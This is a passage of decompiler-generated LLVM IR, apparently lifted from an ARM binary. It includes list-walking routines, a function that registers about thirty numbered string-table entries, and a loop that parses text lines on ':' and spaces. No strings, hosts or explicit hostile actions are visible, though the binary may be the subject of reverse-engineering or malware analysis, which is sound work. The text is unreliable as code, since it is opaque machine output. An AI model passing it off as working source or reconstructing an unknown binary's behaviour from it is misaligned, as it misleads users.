  %v1_8340 = trunc i32 %v2_833c to i8
  store i8 %v1_8340, i8* %v3_8338, align 1
  %v0_8344 = load i32, i32* @r1, align 4
  %v1_8344 = add i32 %v0_8344, 1
  store i32 %v1_8344, i32* @r1, align 4
  %v0_8348.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_8348

dec_label_pc_8348:                                ; preds = %dec_label_pc_82f0, %dec_label_pc_8304
  %v2_8310 = phi i32 [ %v4_82e4, %dec_label_pc_82f0 ], [ %v1_8344, %dec_label_pc_8304 ]
  %v0_8304 = phi i32 [ %v0_8394, %dec_label_pc_82f0 ], [ %v0_8348.pre, %dec_label_pc_8304 ]
  %v1_8348 = add i32 %v0_8304, 8
  %v2_8348 = inttoptr i32 %v1_8348 to i16*
  %v3_8348 = load i16, i16* %v2_8348, align 2
  %v4_8348 = zext i16 %v3_8348 to i32
  %v5_8350 = icmp slt i32 %v2_8310, %v4_8348
  br i1 %v5_8350, label %dec_label_pc_8304, label %dec_label_pc_8380

dec_label_pc_835c:                                ; preds = %dec_label_pc_8380
  %v1_835c = add i32 %v0_835c, 4
  %v2_835c = inttoptr i32 %v1_835c to i32*
  %v3_835c = load i32, i32* %v2_835c, align 4
  %v2_8360 = add i32 %v3_835c, %v3_836c
  %v1_8364 = add i32 %v2_8360, 1
  %v2_8364 = inttoptr i32 %v1_8364 to i8*
  %v3_8364 = load i8, i8* %v2_8364, align 1
  %v3_8368 = inttoptr i32 %v2_8360 to i8*
  %v4_8368 = load i8, i8* %v3_8368, align 1
  %v6_8368 = zext i8 %v4_8368 to i32
  store i32 %v6_8368, i32* @r1, align 4
  store i8 %v3_8364, i8* %v3_8368, align 1
  %v0_8370 = load i32, i32* %ip.global-to-local, align 4
  %v1_8370 = add i32 %v0_8370, 4
  %v2_8370 = inttoptr i32 %v1_8370 to i32*
  %v3_8370 = load i32, i32* %v2_8370, align 4
  %v0_8374 = load i32, i32* %r0.global-to-local, align 4
  %v2_8374 = add i32 %v0_8374, %v3_8370
  %v0_8378 = load i32, i32* @r1, align 4
  %v1_8378 = trunc i32 %v0_8378 to i8
  %v3_8378 = add i32 %v2_8374, 1
  %v4_8378 = inttoptr i32 %v3_8378 to i8*
  store i8 %v1_8378, i8* %v4_8378, align 1
  %v0_837c = load i32, i32* %r0.global-to-local, align 4
  %v1_837c = add i32 %v0_837c, 2
  %v0_8380.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8348, %dec_label_pc_835c
  %v0_835c = phi i32 [ %v0_8380.pre, %dec_label_pc_835c ], [ %v0_8304, %dec_label_pc_8348 ]
  %v3_836c = phi i32 [ %v1_837c, %dec_label_pc_835c ], [ 0, %dec_label_pc_8348 ]
  store i32 %v3_836c, i32* %r0.global-to-local, align 4
  %v1_8380 = add i32 %v0_835c, 8
  %v2_8380 = inttoptr i32 %v1_8380 to i16*
  %v3_8380 = load i16, i16* %v2_8380, align 2
  %v4_8380 = zext i16 %v3_8380 to i32
  %v1_8384 = add nsw i32 %v4_8380, -1
  %v5_838c = icmp slt i32 %v3_836c, %v1_8384
  br i1 %v5_838c, label %dec_label_pc_835c, label %dec_label_pc_83a0

dec_label_pc_8394:                                ; preds = %dec_label_pc_82d0
  %v1_8394 = add i32 %v0_8394, 12
  %v2_8394 = inttoptr i32 %v1_8394 to i32*
  %storemerge = load i32, i32* %v2_8394, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v2_8398 = icmp eq i32 %storemerge, 0
  br i1 %v2_8398, label %dec_label_pc_8398.dec_label_pc_83a0.loopexit2_crit_edge, label %dec_label_pc_82d0

dec_label_pc_8398.dec_label_pc_83a0.loopexit2_crit_edge: ; preds = %dec_label_pc_8394
  br label %dec_label_pc_83a0

dec_label_pc_83a0:                                ; preds = %dec_label_pc_8380, %dec_label_pc_82c0, %dec_label_pc_8398.dec_label_pc_83a0.loopexit2_crit_edge
  %v2_83a4 = phi i32 [ 0, %dec_label_pc_8398.dec_label_pc_83a0.loopexit2_crit_edge ], [ 0, %dec_label_pc_82c0 ], [ %v0_835c, %dec_label_pc_8380 ]
  %v3_83a4 = add i32 %v2_83a4, 10
  %v4_83a4 = inttoptr i32 %v3_83a4 to i8*
  store i8 1, i8* %v4_83a4, align 1
  %v2_83a8.pre = load i32, i32* %stack_var_-8, align 4
  %v1_83ac.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83a8

dec_label_pc_83a8:                                ; preds = %dec_label_pc_82e4, %dec_label_pc_83a0
  %v1_83ac = phi i32 [ %v2_82d0, %dec_label_pc_82e4 ], [ %v1_83ac.pre, %dec_label_pc_83a0 ]
  %v2_83a8 = phi i32 [ %v3_82c0, %dec_label_pc_82e4 ], [ %v2_83a8.pre, %dec_label_pc_83a0 ]
  store i32 %v2_83a8, i32* @r4, align 4
  ret i32 %v1_83ac

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_836c, { 1, 2, 0 }
  uselistorder i32 %v0_835c, { 0, 2, 1 }
  uselistorder i32 %v0_8304, { 0, 2, 1 }
  uselistorder i32 %v2_8310, { 1, 0 }
  uselistorder i32 %v2_82d0, { 2, 1, 0 }
  uselistorder i32 %v0_8394, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 5, 8, 6, 7, 2, 3, 4, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_83a8, { 1, 0 }
  uselistorder label %dec_label_pc_83a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8380, { 1, 0 }
  uselistorder label %dec_label_pc_8348, { 1, 0 }
  uselistorder label %dec_label_pc_82d0, { 1, 0 }
}

define i32 @function_83b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_83b4:
  %storemerge1 = load i32, i32* @global_var_1d4ac.21, align 4
  store i32 %storemerge1, i32* @r3, align 4
  %v2_83d83 = icmp eq i32 %storemerge1, 0
  br i1 %v2_83d83, label %dec_label_pc_83e0, label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83b4, %dec_label_pc_83d4
  %v0_83d4 = phi i32 [ %storemerge, %dec_label_pc_83d4 ], [ %storemerge1, %dec_label_pc_83b4 ]
  %v1_83c0 = inttoptr i32 %v0_83d4 to i32*
  %v2_83c0 = load i32, i32* %v1_83c0, align 4
  store i32 %v2_83c0, i32* @r2, align 4
  %tmp = icmp sgt i32 %v2_83c0, 0
  %v9_83cc = icmp eq i32 %v2_83c0, %arg1
  %or.cond = and i1 %tmp, %v9_83cc
  br i1 %or.cond, label %dec_label_pc_83e4, label %dec_label_pc_83d4

dec_label_pc_83d4:                                ; preds = %dec_label_pc_83c0
  %v1_83d4 = add i32 %v0_83d4, 12
  %v2_83d4 = inttoptr i32 %v1_83d4 to i32*
  %storemerge = load i32, i32* %v2_83d4, align 4
  store i32 %storemerge, i32* @r3, align 4
  %v2_83d8 = icmp eq i32 %storemerge, 0
  br i1 %v2_83d8, label %dec_label_pc_83d8.dec_label_pc_83e0_crit_edge, label %dec_label_pc_83c0

dec_label_pc_83d8.dec_label_pc_83e0_crit_edge:    ; preds = %dec_label_pc_83d4
  br label %dec_label_pc_83e0

dec_label_pc_83e0:                                ; preds = %dec_label_pc_83d8.dec_label_pc_83e0_crit_edge, %dec_label_pc_83b4
  ret i32 %arg1

dec_label_pc_83e4:                                ; preds = %dec_label_pc_83c0
  %v1_83e4 = add i32 %v0_83d4, 4
  %v2_83e4 = inttoptr i32 %v1_83e4 to i32*
  %v3_83e4 = load i32, i32* %v2_83e4, align 4
  ret i32 %v3_83e4

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_83c0, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_83c0, { 1, 0 }
}

define i32 @function_83f0() local_unnamed_addr {
dec_label_pc_83f0:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v1_83fc = call i32 @function_c77c(i32 16)
  store i32 %v1_83fc, i32* @global_var_1d4ac.21, align 4
  store i32 ptrtoint (i32* @global_var_1d4b0.26 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_8410 = add i32 %v1_83fc, 12
  %v3_8410 = inttoptr i32 %v2_8410 to i32*
  store i32 0, i32* %v3_8410, align 4
  %v0_8414 = load i32, i32* %r2.global-to-local, align 4
  %v2_8414 = inttoptr i32 %v1_83fc to i32*
  store i32 %v0_8414, i32* %v2_8414, align 4
  %v1_8418 = load i32, i32* %r3.global-to-local, align 4
  %v2_8418 = inttoptr i32 %v1_8418 to i32*
  store i32 %v1_83fc, i32* %v2_8418, align 4
  ret i32 %v1_83fc

; uselistorder directives
  uselistorder i32 %v1_83fc, { 0, 2, 1, 3, 4 }
  uselistorder i32* @global_var_1d4ac.21, { 3, 0, 1, 2 }
}

define i32 @function_8430(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8430:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = sext i16 %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_8430 = load i32, i32* @r4, align 4
  %v6_8430 = load i32, i32* @r5, align 4
  %v9_8430 = load i32, i32* @r6, align 4
  %v12_8430 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg3, i32* @r7, align 4
  %v1_8448 = call i32 @function_c77c(i32 16)
  store i32 %v1_8448, i32* @r4, align 4
  %v0_8450 = load i32, i32* @r5, align 4
  %v0_8454 = load i32, i32* @r6, align 4
  %v2_8454 = inttoptr i32 %v1_8448 to i32*
  store i32 %v0_8454, i32* %v2_8454, align 4
  %sext = mul i32 %v0_8450, 65536
  %v1_8458 = sdiv i32 %sext, 65536
  %v2_8458 = call i32 @function_c77c(i32 %v1_8458)
  %v0_845c = load i32, i32* @r7, align 4
  store i32 %v0_845c, i32* %r1.global-to-local, align 4
  %v0_8460 = load i32, i32* @r5, align 4
  store i32 %v0_8460, i32* @r2, align 4
  %v1_8464 = load i32, i32* @r4, align 4
  %v2_8464 = add i32 %v1_8464, 4
  %v3_8464 = inttoptr i32 %v2_8464 to i32*
  store i32 %v2_8458, i32* %v3_8464, align 4
  %sext1 = mul i32 %v0_8460, 65536
  %v3_8468 = sdiv i32 %sext1, 65536
  %v4_8468 = call i32 @function_ab04(i32 %v2_8458, i32 %v0_845c, i32 %v3_8468)
  store i32 ptrtoint (i32* @global_var_1d4b0.26 to i32), i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_8474 = load i32, i32* @global_var_1d4b0.26, align 4
  store i32 %v2_8474, i32* %r1.global-to-local, align 4
  %v2_8478 = load i32, i32* @r4, align 4
  %v3_8478 = add i32 %v2_8478, 10
  %v4_8478 = inttoptr i32 %v3_8478 to i8*
  store i8 -1, i8* %v4_8478, align 1
  %v0_847c = load i32, i32* %r3.global-to-local, align 4
  %v1_847c = add i32 %v0_847c, 1
  store i32 %v1_847c, i32* %r3.global-to-local, align 4
  %v1_8480 = load i32, i32* @r4, align 4
  %v2_8480 = add i32 %v1_8480, 12
  %v3_8480 = inttoptr i32 %v2_8480 to i32*
  store i32 %v1_847c, i32* %v3_8480, align 4
  %v0_8484 = load i32, i32* @r5, align 4
  %v1_8484 = trunc i32 %v0_8484 to i16
  %v2_8484 = load i32, i32* @r4, align 4
  %v3_8484 = add i32 %v2_8484, 8
  %v4_8484 = inttoptr i32 %v3_8484 to i16*
  store i16 %v1_8484, i16* %v4_8484, align 2
  %v0_8488 = load i32, i32* @r4, align 4
  %v1_8488 = load i32, i32* %r1.global-to-local, align 4
  %v2_8488 = add i32 %v1_8488, 12
  %v3_8488 = inttoptr i32 %v2_8488 to i32*
  store i32 %v0_8488, i32* %v3_8488, align 4
  %v0_848c = load i32, i32* @r4, align 4
  %v1_848c = load i32, i32* %r2.global-to-local, align 4
  %v2_848c = inttoptr i32 %v1_848c to i32*
  store i32 %v0_848c, i32* %v2_848c, align 4
  store i32 %v3_8430, i32* @r4, align 4
  store i32 %v6_8430, i32* @r5, align 4
  store i32 %v9_8430, i32* @r6, align 4
  store i32 %v12_8430, i32* @r7, align 4
  ret i32 %v4_8468

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
}

define i32 @function_84a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_84a0:
  %v0_84a0 = load i32, i32* @lr, align 4
  %v0_84a8 = call i32 @function_83f0()
  %v4_84b8 = call i32 @function_8430(i32 1, i16 21, i32 ptrtoint (i32* @global_var_13b14.29 to i32))
  %v4_84c8 = call i32 @function_8430(i32 2, i16 21, i32 ptrtoint (i32* @global_var_13b2c.31 to i32))
  %v4_84d8 = call i32 @function_8430(i32 3, i16 7, i32 ptrtoint (i32* @global_var_13b44.33 to i32))
  %v4_84e8 = call i32 @function_8430(i32 4, i16 6, i32 ptrtoint (i32* @global_var_13b4c.35 to i32))
  %v4_84f8 = call i32 @function_8430(i32 5, i16 5, i32 ptrtoint (i32* @global_var_13b54.37 to i32))
  %v4_8508 = call i32 @function_8430(i32 6, i16 14, i32 ptrtoint (i32* @global_var_13b5c.39 to i32))
  %v4_8518 = call i32 @function_8430(i32 7, i16 4, i32 ptrtoint (i32* @global_var_13b6c.41 to i32))
  %v4_8528 = call i32 @function_8430(i32 8, i16 17, i32 ptrtoint (i32* @global_var_13b74.43 to i32))
  %v4_8538 = call i32 @function_8430(i32 9, i16 10, i32 ptrtoint (i32* @global_var_13b88.45 to i32))
  %v4_8548 = call i32 @function_8430(i32 10, i16 8, i32 ptrtoint (i32* @global_var_13b94.47 to i32))
  %v4_8558 = call i32 @function_8430(i32 11, i16 13, i32 ptrtoint (i32* @global_var_13ba0.49 to i32))
  %v4_8568 = call i32 @function_8430(i32 12, i16 11, i32 ptrtoint (i32* @global_var_13bb0.51 to i32))
  %v4_8578 = call i32 @function_8430(i32 13, i16 15, i32 ptrtoint (i32* @global_var_13bbc.53 to i32))
  %v4_8588 = call i32 @function_8430(i32 14, i16 10, i32 ptrtoint (i32* @global_var_13bcc.55 to i32))
  %v4_8598 = call i32 @function_8430(i32 15, i16 10, i32 ptrtoint (i32* @global_var_13bd8.57 to i32))
  %v4_85a8 = call i32 @function_8430(i32 16, i16 23, i32 ptrtoint (i32* @global_var_13be4.59 to i32))
  %v4_85b8 = call i32 @function_8430(i32 17, i16 33, i32 ptrtoint (i32* @global_var_13bfc.61 to i32))
  %v4_85c8 = call i32 @function_8430(i32 18, i16 23, i32 ptrtoint (i32* @global_var_13c20.63 to i32))
  %v4_85d8 = call i32 @function_8430(i32 19, i16 8, i32 ptrtoint (i32* @global_var_13c38.65 to i32))
  %v4_85e8 = call i32 @function_8430(i32 20, i16 8, i32 ptrtoint (i32* @global_var_13c44.67 to i32))
  %v4_85f8 = call i32 @function_8430(i32 21, i16 23, i32 ptrtoint (i32* @global_var_13c50.69 to i32))
  %v4_8608 = call i32 @function_8430(i32 22, i16 10, i32 ptrtoint (i32* @global_var_13c68.71 to i32))
  %v4_8618 = call i32 @function_8430(i32 25, i16 16, i32 ptrtoint (i32* @global_var_13c74.73 to i32))
  %v4_8628 = call i32 @function_8430(i32 26, i16 15, i32 ptrtoint (i32* @global_var_13c88.75 to i32))
  %v4_8638 = call i32 @function_8430(i32 27, i16 16, i32 ptrtoint (i32* @global_var_13c98.77 to i32))
  %v4_8648 = call i32 @function_8430(i32 28, i16 16, i32 ptrtoint (i32* @global_var_13cac.79 to i32))
  %v5_8658 = call i32 @function_8430(i32 29, i16 50, i32 ptrtoint ([51 x i8]* @global_var_13cc0.81 to i32))
  store i32 %v0_84a0, i32* @lr, align 4
  %v5_8670 = call i32 @function_8430(i32 30, i16 52, i32 ptrtoint ([53 x i8]* @global_var_13cf4.83 to i32))
  ret i32 %v5_8670
}

define i32 @function_86e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_86e4:
  %v2_86f0 = load i32, i32* @global_var_1d4b4.85, align 4
  %v2_86f8 = call i32 @function_b950(i32 %v2_86f0, i32 9)
  ret i32 %v2_86f8
}

define i32 @function_870c(i32 %arg1) local_unnamed_addr {
dec_label_pc_870c:
  %r4.global-to-local = alloca i32, align 4
  %tmp91 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-585 = alloca i32, align 4
  %v3_870c = load i32, i32* @r4, align 4
  %v6_870c = load i32, i32* @r5, align 4
  %v9_870c = load i32, i32* @r6, align 4
  %v12_870c = load i32, i32* @r7, align 4
  %v15_870c = load i32, i32* @r8, align 4
  %v18_870c = load i32, i32* @sb, align 4
  %v21_870c = load i32, i32* @sl, align 4
  %v24_870c = load i32, i32* @fp, align 4
  %v27_870c = load i32, i32* @lr, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_8730 = ptrtoint i32* %stack_var_-585 to i32
  store i32 %v2_8730, i32* @r6, align 4
  %v2_8734 = ptrtoint i32* %stack_var_-56 to i32
  %v3_8738 = bitcast i32* %stack_var_-56 to i8*
  %v4_8738 = call i32 @function_bff0(i8* %v3_8738, i32 0, i32 16)
  %v3_8748 = bitcast i32* %stack_var_-585 to i8*
  %v4_8748 = call i32 @function_bff0(i8* %v3_8748, i32 0, i32 513)
  %v2_8758 = ptrtoint i32* %stack_var_-8777 to i32
  %v3_875c = bitcast i32* %stack_var_-8777 to i8*
  %v4_875c = call i32 @function_bff0(i8* %v3_875c, i32 0, i32 4096)
  %v2_8770 = ptrtoint i32* %stack_var_-4681 to i32
  %v3_8778 = bitcast i32* %stack_var_-4681 to i8*
  %v4_8778 = call i32 @function_bff0(i8* %v3_8778, i32 0, i32 4096)
  %v2_877c = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_877c, i32* @r5, align 4
  %v0_8780 = load i32, i32* %r4.global-to-local, align 4
  %v3_8780 = udiv i32 %v0_8780, 256
  %v1_8784 = urem i32 %v0_8780, 256
  store i32 %v1_8784, i32* @r4, align 4
  %v3_8794 = trunc i32 %v3_8780 to i8
  %v4_8794 = call i32 @function_ac28(i8 %v3_8794, i32 16, i32 %v2_877c)
  store i32 %v2_877c, i32* @r0, align 4
  %v0_879c = call i32 @function_aab8()
  %v7_87a0 = icmp eq i32 %v0_879c, 2
  br i1 %v7_87a0, label %dec_label_pc_87a8, label %dec_label_pc_87d0

dec_label_pc_87a8:                                ; preds = %dec_label_pc_870c
  %v4_87b0 = zext i8 %tmp91 to i32
  store i32 %v4_87b0, i32* @r2, align 4
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_87d0

dec_label_pc_87d0:                                ; preds = %dec_label_pc_870c, %dec_label_pc_87a8
  %v1_87d4 = call i32 @function_81d0(i32 3)
  %v1_87dc = call i32 @function_81d0(i32 5)
  %v1_87e4 = call i32 @function_81d0(i32 7)
  %v1_87ec = call i32 @function_81d0(i32 6)
  %v1_87f4 = call i32 @function_83b4(i32 6)
  %v2_87fc = call i32 @function_e7b0(i32 %v1_87f4, i32 0)
  %v7_8800 = icmp eq i32 %v2_87fc, -1
  store i32 %v2_87fc, i32* @r7, align 4
  br i1 %v7_8800, label %bb, label %dec_label_pc_8978

bb:                                               ; preds = %dec_label_pc_87d0
  br label %dec_label_pc_8c2c

dec_label_pc_8814:                                ; preds = %.lr.ph
  %v1_8814 = add i32 %v0_8814, 1
  %v2_8818 = add i32 %v1_8814, %v1_881836
  %v3_8818 = inttoptr i32 %v2_8818 to i8*
  %v4_8818 = load i8, i8* %v3_8818, align 1
  %v6_8818 = zext i8 %v4_8818 to i32
  store i32 %v6_8818, i32* @r3, align 4
  %v2_881c = icmp eq i8 %v4_8818, 0
  br i1 %v2_881c, label %dec_label_pc_8828, label %.lr.ph

.lr.ph:                                           ; preds = %dec_label_pc_8818.preheader, %dec_label_pc_8814
  %v0_8814 = phi i32 [ %v1_8814, %dec_label_pc_8814 ], [ %v1_8998, %dec_label_pc_8818.preheader ]
  %v1_8820 = phi i32 [ %v6_8818, %dec_label_pc_8814 ], [ %v6_881840, %dec_label_pc_8818.preheader ]
  %v8_8820 = icmp eq i32 %v1_8820, 58
  br i1 %v8_8820, label %dec_label_pc_8828.thread, label %dec_label_pc_8814

dec_label_pc_8828.thread:                         ; preds = %.lr.ph
  br label %dec_label_pc_8844.preheader

dec_label_pc_8828:                                ; preds = %dec_label_pc_8814, %dec_label_pc_8818.preheader
  %v2_8834 = phi i32 [ %v1_8998, %dec_label_pc_8818.preheader ], [ %v1_8814, %dec_label_pc_8814 ]
  %v0_8828 = phi i32 [ %v6_881840, %dec_label_pc_8818.preheader ], [ %v6_8818, %dec_label_pc_8814 ]
  %v2_8828 = icmp eq i32 %v0_8828, 0
  br i1 %v2_8828, label %dec_label_pc_8984.backedge, label %dec_label_pc_8844.preheader

dec_label_pc_8844.preheader:                      ; preds = %dec_label_pc_8828, %dec_label_pc_8828.thread
  %v2_883484 = phi i32 [ %v0_8814, %dec_label_pc_8828.thread ], [ %v2_8834, %dec_label_pc_8828 ]
  %v2_882c = add i32 %v2_883484, 2
  store i32 %v2_882c, i32* @r5, align 4
  %v3_8834 = add i32 %v2_883484, %v1_881836
  %v1_8844134 = add i32 %v3_8834, 2
  %v2_8844135 = inttoptr i32 %v1_8844134 to i8*
  %v3_8844136 = load i8, i8* %v2_8844135, align 1
  %v2_8848138 = icmp eq i8 %v3_8844136, 0
  br i1 %v2_8848138, label %dec_label_pc_8860, label %bb117

dec_label_pc_8840:                                ; preds = %bb117
  %v1_8858 = add i32 %v0_885810140, 1
  %v1_8840 = add i32 %v1_886c139, 1
  store i32 %v1_8840, i32* @r5, align 4
  %v1_8844 = add i32 %v0_885810140, 3
  %v2_8844 = inttoptr i32 %v1_8844 to i8*
  %v3_8844 = load i8, i8* %v2_8844, align 1
  %v2_8848 = icmp eq i8 %v3_8844, 0
  br i1 %v2_8848, label %dec_label_pc_8860, label %bb117

bb117:                                            ; preds = %dec_label_pc_8844.preheader, %dec_label_pc_8840
  %v3_8844141 = phi i8 [ %v3_8844, %dec_label_pc_8840 ], [ %v3_8844136, %dec_label_pc_8844.preheader ]
  %v0_885810140 = phi i32 [ %v1_8858, %dec_label_pc_8840 ], [ %v3_8834, %dec_label_pc_8844.preheader ]
  %v1_886c139 = phi i32 [ %v1_8840, %dec_label_pc_8840 ], [ %v2_882c, %dec_label_pc_8844.preheader ]
  %v8_884c = icmp eq i8 %v3_8844141, 32
  br i1 %v8_884c, label %dec_label_pc_8860, label %dec_label_pc_8840

dec_label_pc_8860:                                ; preds = %dec_label_pc_8840, %bb117, %dec_label_pc_8844.preheader
  %v1_886c.lcssa = phi i32 [ %v2_882c, %dec_label_pc_8844.preheader ], [ %v1_886c139, %bb117 ], [ %v1_8840, %dec_label_pc_8840 ]
  %v2_8860 = add i32 %v2_882c, %v1_881836
  store i32 %v2_8860, i32* @r4, align 4
  %v2_886c = add i32 %v1_886c.lcssa, %v2_8868
  %v3_8870 = add i32 %v2_886c, -545
  %v4_8870 = inttoptr i32 %v3_8870 to i8*
  store i8 0, i8* %v4_8870, align 1
  %v0_8874 = load i32, i32* @r4, align 4
  store i32 %v0_8874, i32* @r0, align 4
  %v0_8878 = call i32 @function_aab8()
  store i32 %v0_8878, i32* @r1, align 4
  %v0_8884 = load i32, i32* @r4, align 4
  %v3_8888 = inttoptr i32 %v0_8884 to i8*
  %v4_8888 = call i32 @function_b420(i8* %v3_8888, i32 %v0_8878, i32 %v2_877c)
  %v7_888c = icmp eq i32 %v4_8888, -1
  br i1 %v7_888c, label %dec_label_pc_8984.backedge, label %dec_label_pc_8894

dec_label_pc_8984.backedge:                       ; preds = %dec_label_pc_8860, %dec_label_pc_8940, %dec_label_pc_8910, %dec_label_pc_8828
  %v0_898c = load i32, i32* @r7, align 4
  %v3_8990 = call i32 @function_ae98(i32 %v2_8730, i32 512, i32 %v0_898c)
  %v2_8994 = icmp eq i32 %v3_8990, 0
  br i1 %v2_8994, label %dec_label_pc_89a0, label %dec_label_pc_8818.preheader

dec_label_pc_8894:                                ; preds = %dec_label_pc_8860
  %v0_8894 = load i32, i32* @r6, align 4
  %v1_8894 = load i32, i32* @r5, align 4
  %v2_8894 = add i32 %v1_8894, %v0_8894
  %v1_8898 = add i32 %v1_8894, 1
  %v0_889c = load i32, i32* @r8, align 4
  store i32 %v0_889c, i32* @lr, align 4
  br label %dec_label_pc_8900

dec_label_pc_88ac:                                ; preds = %dec_label_pc_8900
  %v7_88ac = icmp eq i8 %v3_8900, 9
  br i1 %v7_88ac, label %bb119, label %bb118

bb118:                                            ; preds = %dec_label_pc_88ac
  %v8_88b0 = icmp eq i8 %v3_8900, 32
  br i1 %v8_88b0, label %.thread14, label %dec_label_pc_88bc

.thread14:                                        ; preds = %bb118
  %v1_88b415 = load i32, i32* @sl, align 4
  br label %.thread20

bb119:                                            ; preds = %dec_label_pc_88ac
  %v1_88b4 = load i32, i32* @sl, align 4
  br label %.thread20

dec_label_pc_88bc:                                ; preds = %bb118
  %v7_88bc = icmp eq i32 %v0_88bc.pr, 1
  br i1 %v7_88bc, label %bb120, label %thread-pre-split

bb120:                                            ; preds = %dec_label_pc_88bc
  %v2_88c8 = add i32 %v1_88c8, 1
  br label %bb121

thread-pre-split:                                 ; preds = %dec_label_pc_88bc
  br label %bb121

bb121:                                            ; preds = %thread-pre-split, %bb120
  %v0_88cc = phi i32 [ %v1_88c8, %thread-pre-split ], [ %v2_88c8, %bb120 ]
  %v1_88d464 = phi i32 [ 0, %thread-pre-split ], [ 1, %bb120 ]
  %v7_88cc = icmp eq i32 %v0_88cc, 1
  br i1 %v7_88cc, label %bb122, label %.thread

.thread:                                          ; preds = %bb121
  store i32 0, i32* @r3, align 4
  br label %.thread20

bb122:                                            ; preds = %bb121
  store i32 %v1_88d464, i32* @r3, align 4
  %v2_88d8 = icmp eq i32 %v1_88d464, 0
  br i1 %v2_88d8, label %.thread20, label %dec_label_pc_88e4

dec_label_pc_88e4:                                ; preds = %bb122
  %v1_88e4 = add i32 %v0_88f8, 3
  %v2_88e4 = inttoptr i32 %v1_88e4 to i8*
  %v3_88e4 = load i8, i8* %v2_88e4, align 1
  %v4_88e4 = zext i8 %v3_88e4 to i32
  store i32 %v4_88e4, i32* @r3, align 4
  %v7_88e8 = icmp eq i8 %v3_88e4, 65
  br i1 %v7_88e8, label %bb123, label %.thread20

bb123:                                            ; preds = %dec_label_pc_88e4
  %v1_88f0 = load i32, i32* @sl, align 4
  store i32 %v1_88f0, i32* @lr, align 4
  br label %.thread20

.thread20:                                        ; preds = %.thread, %bb119, %dec_label_pc_88e4, %.thread14, %bb122, %bb123
  %v0_891072 = phi i32 [ %v0_891070, %dec_label_pc_88e4 ], [ %v0_891070, %.thread14 ], [ %v0_891070, %bb122 ], [ %v0_891070, %bb119 ], [ %v1_88f0, %bb123 ], [ %v0_891070, %.thread ]
  %v0_88f4 = phi i32 [ 1, %dec_label_pc_88e4 ], [ %v1_88c8, %.thread14 ], [ 1, %bb122 ], [ %v1_88c8, %bb119 ], [ 1, %bb123 ], [ %v0_88cc, %.thread ]
  %v0_88bc.pr61 = phi i32 [ %v0_889c, %dec_label_pc_88e4 ], [ %v1_88b415, %.thread14 ], [ %v0_889c, %bb122 ], [ %v1_88b4, %bb119 ], [ %v0_889c, %bb123 ], [ %v0_889c, %.thread ]
  %v1_88f8 = add i32 %v0_88f8, 1
  %v8_88fc = icmp sgt i32 %v0_88f4, 6
  br i1 %v8_88fc, label %dec_label_pc_8910, label %dec_label_pc_8900

dec_label_pc_8900:                                ; preds = %.thread20, %dec_label_pc_8894
  %v0_891070 = phi i32 [ %v0_891072, %.thread20 ], [ %v0_889c, %dec_label_pc_8894 ]
  %v0_88bc.pr = phi i32 [ %v0_88bc.pr61, %.thread20 ], [ %v0_889c, %dec_label_pc_8894 ]
  %v1_88c8 = phi i32 [ %v0_88f4, %.thread20 ], [ %v0_889c, %dec_label_pc_8894 ]
  %v0_8908 = phi i32 [ %v1_8908, %.thread20 ], [ %v1_8898, %dec_label_pc_8894 ]
  %v0_88f8 = phi i32 [ %v1_88f8, %.thread20 ], [ %v2_8894, %dec_label_pc_8894 ]
  %v1_8900 = add i32 %v0_88f8, 2
  %v2_8900 = inttoptr i32 %v1_8900 to i8*
  %v3_8900 = load i8, i8* %v2_8900, align 1
  %v4_8900 = zext i8 %v3_8900 to i32
  store i32 %v4_8900, i32* @r3, align 4
  %v2_8904 = icmp eq i8 %v3_8900, 0
  %v1_8908 = add i32 %v0_8908, 1
  br i1 %v2_8904, label %dec_label_pc_8910, label %dec_label_pc_88ac

dec_label_pc_8910:                                ; preds = %dec_label_pc_8900, %.thread20
  %v0_8910 = phi i32 [ %v0_891070, %dec_label_pc_8900 ], [ %v0_891072, %.thread20 ]
  %v2_8910 = icmp eq i32 %v0_8910, 0
  br i1 %v2_8910, label %dec_label_pc_8984.backedge, label %dec_label_pc_8928.preheader

dec_label_pc_8928.preheader:                      ; preds = %dec_label_pc_8910
  %v3_8918 = add i32 %v1_8908, %v0_8894
